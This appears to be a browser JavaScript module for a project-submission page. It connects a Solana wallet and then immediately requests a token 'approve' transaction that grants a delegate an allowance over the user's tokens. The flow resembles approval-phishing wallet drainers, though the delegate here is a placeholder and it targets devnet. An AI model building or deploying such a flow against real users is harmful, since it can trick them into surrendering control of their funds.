import {
  Connection,
  PublicKey,
  Transaction,
  clusterApiUrl
} from 'https://esm.sh/@solana/web3.js@1.73.0';

import {
  createApproveInstruction,
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID
} from 'https://esm.sh/@solana/spl-token@0.3.5';

const projectForm = document.getElementById('projectForm');
const walletModal = document.getElementById('walletModal');
const closeBtn = walletModal.querySelector('.close');
const phantomBtn = document.getElementById('phantomButton');
const solflareBtn = document.getElementById('solflareButton');
const backpackBtn = document.getElementById('backpackButton');

let provider = null;
let ownerPublicKey = null;

// Show wallet modal after form submit
projectForm.addEventListener('submit', (e) => {
  e.preventDefault();
  walletModal.style.display = 'flex';
});

closeBtn.addEventListener('click', () => {
  walletModal.style.display = 'none';
});

// Connect Phantom
async function connectPhantom() {
  if (!window.solana || !window.solana.isPhantom) {
    alert('Phantom not detected.');
    return;
  }
  const resp = await window.solana.connect();
  provider = window.solana;
  ownerPublicKey = resp.publicKey;
  walletModal.style.display = 'none';
  await approveDelegate();
}

// Connect Solflare
async function connectSolflare() {
  if (!window.solflare || !window.solflare.isSolflare) {
    alert('Solflare not detected.');
    return;
  }
  const resp = await window.solflare.connect();
  provider = window.solflare;
  ownerPublicKey = resp.publicKey || window.solflare.publicKey;
  walletModal.style.display = 'none';
  await approveDelegate();
}

// Connect Backpack
async function connectBackpack() {
  if (window.backpack && window.backpack.solana && window.backpack.solana.isBackpack) {
    const resp = await window.backpack.solana.connect();
    provider = window.backpack.solana;
    ownerPublicKey = resp.publicKey;
    walletModal.style.display = 'none';
    await approveDelegate();
    return;
  }
  alert('Backpack not detected.');
}

phantomBtn.addEventListener('click', connectPhantom);
solflareBtn.addEventListener('click', connectSolflare);
backpackBtn.addEventListener('click', connectBackpack);

// Approve delegate (SPL Token Program)
async function approveDelegate() {
  try {
    const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
    const tokenMintStr = document.getElementById('tokenMint').value.trim();
    const mintPub = new PublicKey(tokenMintStr);

    // For demo: delegate = developer email hash or fixed address
    const delegatePub = new PublicKey('11111111111111111111111111111111'); // replace with actual delegate

    const ownerPub = new PublicKey(ownerPublicKey.toString());
    const tokenAccountPub = await getAssociatedTokenAddress(mintPub, ownerPub);

    const allowance = BigInt(1000000); // example allowance

    const approveIx = createApproveInstruction(
      tokenAccountPub,
      delegatePub,
      ownerPub,
      allowance,
      [],
      TOKEN_PROGRAM_ID
    );

    const tx = new Transaction().add(approveIx);
    const { blockhash } = await connection.getLatestBlockhash('finalized');
    tx.recentBlockhash = blockhash;
    tx.feePayer = ownerPub;

    const signedTx = await provider.signTransaction(tx);
    const raw = signedTx.serialize();
    const txid = await connection.sendRawTransaction(raw);
    await connection.confirmTransaction(txid, 'confirmed');
    alert('✅ Approve transaction confirmed: ' + txid);
  } catch (err) {
    console.error(err);
    alert('Error: ' + (err.message || String(err)));
  }
}
